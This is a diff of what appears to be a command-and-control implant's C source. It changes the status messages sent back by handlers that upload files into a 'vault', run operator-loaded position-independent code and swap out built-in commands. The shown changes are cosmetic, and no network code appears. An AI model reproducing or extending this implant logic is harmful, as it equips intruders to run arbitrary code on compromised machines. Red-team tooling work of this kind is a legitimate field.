@@ -79,7 +79,7 @@ void agent_sleep(AgentState *state, TaskInfo *task) {
 	dprintf("Changed sleep interval to: %i", state->sleep_time);
 	#endif
 	
-	agent_post(state, task, "changed sleep interval", STR(STATUS_SUCCESS));
+	agent_post(state, task, "", STR(STATUS_SUCCESS));
 }
 
 void agent_exit(AgentState *state, TaskInfo *task) {
@@ -107,7 +107,7 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
 		dprintf("Failed to resolve '%s' PICO", state->builtin_picos.whoami);
 		#endif
 		
-		agent_post(state, task, "failed to resolve PICO", STR(STATUS_CANNOT_RESOLVE_PICO));
+		agent_post(state, task, "", STR(STATUS_CANNOT_RESOLVE_PICO));
 		return;
 	}
 	
@@ -118,7 +118,7 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
 		agent_post(state, task, whoami_output, STR(STATUS_SUCCESS));
 		KERNEL32$VirtualFree(whoami_output, 0, MEM_RELEASE);
 	} else {
-		agent_post(state, task, "<UNKNOWN>", STR(STATUS_SUCCESS));
+		agent_post(state, task, "", STR(STATUS_COMMAND_FAILED));
 	}
 	
 	free_resolved_pico(&pico);
@@ -126,7 +126,7 @@ void agent_whoami(AgentState *state, TaskInfo *task) {
 
 void agent_register(AgentState *state, TaskInfo *task) {
 	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
-		agent_post(state, task, "no filename provided", STR(STATUS_MISSING_FILENAME));
+		agent_post(state, task, "", STR(STATUS_MISSING_FILENAME));
 		return;
 	}
 
@@ -134,7 +134,7 @@ void agent_register(AgentState *state, TaskInfo *task) {
 	char *uuid = MSVCRT$strtok(NULL, "\t");
 	
 	if (is_in_vault(&state->file_vault, name) == TRUE) {
-		agent_post(state, task, "duplicate filename", STR(STATUS_DUPLICATE_FILENAME));
+		agent_post(state, task, "", STR(STATUS_DUPLICATE_FILENAME));
 		return;
 	}
 
@@ -157,11 +157,11 @@ void agent_register(AgentState *state, TaskInfo *task) {
 	#endif
 
 	if (upload.error == TRUE) {
-		agent_post(state, task, "upload failed", STR(STATUS_UPLOAD_FAILED));
+		agent_post(state, task, "", STR(STATUS_UPLOAD_FAILED));
 	} else if (add_to_vault(&state->file_vault, name, upload.current_buffer, upload.buflen) == TRUE) {
 		agent_post(state, task, name, STR(STATUS_SUCCESS));
 	} else {
-		agent_post(state, task, "vault full", STR(STATUS_VAULT_FULL));
+		agent_post(state, task, "", STR(STATUS_VAULT_FULL));
 	}
 	
 	free_upload_manager(&upload);
@@ -181,9 +181,9 @@ void agent_unregister(AgentState *state, TaskInfo *task) {
 	#endif
 	
 	if (result == TRUE) {
-		agent_post(state, task, "removed from vault", STR(STATUS_SUCCESS)); 
+		agent_post(state, task, "", STR(STATUS_SUCCESS)); 
 	} else {
-		agent_post(state, task, "could not remove from vault", STR(STATUS_VAULT_REMOVAL_FAILED));
+		agent_post(state, task, "", STR(STATUS_VAULT_REMOVAL_FAILED));
 	}
 }
 
@@ -199,25 +199,25 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 		dprintf("Failed to resolve '%s' PICO", name);
 		#endif
 		
-		agent_post(state, task, "failed to resolve PICO", STR(STATUS_CANNOT_RESOLVE_PICO));
+		agent_post(state, task, "", STR(STATUS_CANNOT_RESOLVE_PICO));
 		return;
 	}
 	
 	GENERIC_PICO entrypoint = (GENERIC_PICO) pico.entrypoint;
 	char *pico_output = entrypoint(args);
 	
-	if (pico_output == NULL) {
-		pico_output = "(no output)";
+	if (pico_output != NULL) {
+		agent_post(state, task, pico_output, STR(STATUS_SUCCESS));
+	} else {
+		agent_post(state, task, "", STR(STATUS_SUCCESS));
 	}
-	
-	agent_post(state, task, pico_output, STR(STATUS_SUCCESS));
 	
 	free_resolved_pico(&pico);
 }
 
 void agent_morph(AgentState *state, TaskInfo *task) {
 	if (task->parameters[0] == 0x09 || MSVCRT$strlen(task->parameters) == 0) {
-		agent_post(state, task, "no command", STR(STATUS_MISSING_COMMAND));
+		agent_post(state, task, "", STR(STATUS_MISSING_COMMAND));
 		return;
 	}
 
@@ -225,22 +225,22 @@ void agent_morph(AgentState *state, TaskInfo *task) {
 	char *pico = MSVCRT$strtok(NULL, "\t");
 	
 	if (is_in_vault(&state->file_vault, pico) == FALSE) {
-		agent_post(state, task, "no pico with that name has been registered", STR(STATUS_UNKNOWN_PICO));
+		agent_post(state, task, "", STR(STATUS_UNKNOWN_PICO));
 		return;
 	}
 	
 	if (MSVCRT$strcmp(cmd, "whoami") == 0) {
 		if (remove_from_vault(&state->file_vault, state->builtin_picos.whoami) == FALSE) {
-			agent_post(state, task, "failed to remove old command from vault", STR(STATUS_VAULT_REMOVAL_FAILED));
+			agent_post(state, task, "", STR(STATUS_VAULT_REMOVAL_FAILED));
 			return;
 		}
 		
 		state->builtin_picos.whoami = clone_str(pico);
-		agent_post(state, task, "command replaced", STR(STATUS_SUCCESS));
+		agent_post(state, task, "", STR(STATUS_SUCCESS));
 		return;
 	}
 	
-	agent_post(state, task, "command not found or morph not supported", STR(STATUS_UNKNOWN_COMMAND));
+	agent_post(state, task, "", STR(STATUS_UNKNOWN_COMMAND));
 }
 
 void process_task(TaskInfo *task, AgentState *state) {
